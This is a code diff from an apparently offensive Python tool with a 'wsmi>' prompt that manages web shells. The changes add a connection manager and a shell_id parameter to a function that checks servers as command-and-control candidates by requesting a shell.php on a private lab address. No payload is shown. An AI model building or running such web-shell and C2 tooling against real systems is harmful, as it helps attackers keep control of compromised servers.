@@ -8,7 +8,7 @@ import shells
 import encoders
 import random
 import time
-from classes import connection 
+from classes import connection,connectionManager
 
 
 #variables related to threading
@@ -24,6 +24,7 @@ database_name = ""
 prompt = "wsmi>"
 directory = ""
 current_shell_id = 0
+connection_manager = None
 connect = None #might have to change this to being per listener
 #need to get rid of this so that we can have more than one thread derp
 
@@ -241,7 +242,7 @@ def manage_random_list():
 	yield port_number
 """
 
-def run_candidate_threads(thread_count, timing):
+def run_candidate_threads(thread_count, timing, shell_id):
 	"""
 		Runs and manages threads for checking whether or not a server would be a good
 		command and control candidate.
@@ -257,7 +258,7 @@ def run_candidate_threads(thread_count, timing):
 	for thread in listener_array:#herp derp want the object not a pointer to it.
 		thread.start()
 	
-	http_thread = threading_http_request("192.168.56.101/shell.php",temp_gen,"192.168.56.102","ok")
+	http_thread = threading_http_request("192.168.56.101/shell.php",temp_gen,"192.168.56.102","ok")#url,port,self_ip
 	http_thread.start()
 
 def check_candidacy():
@@ -267,7 +268,7 @@ def check_candidacy():
 	"""
 	num_threads = int(raw_input("number of threads:"))
 	#timing = int(raw_input("timing level(0-5):"))
-	run_candidate_threads(num_threads,0)
+	run_candidate_threads(num_threads,0,1)
 
 def show_contents():
 	global directory
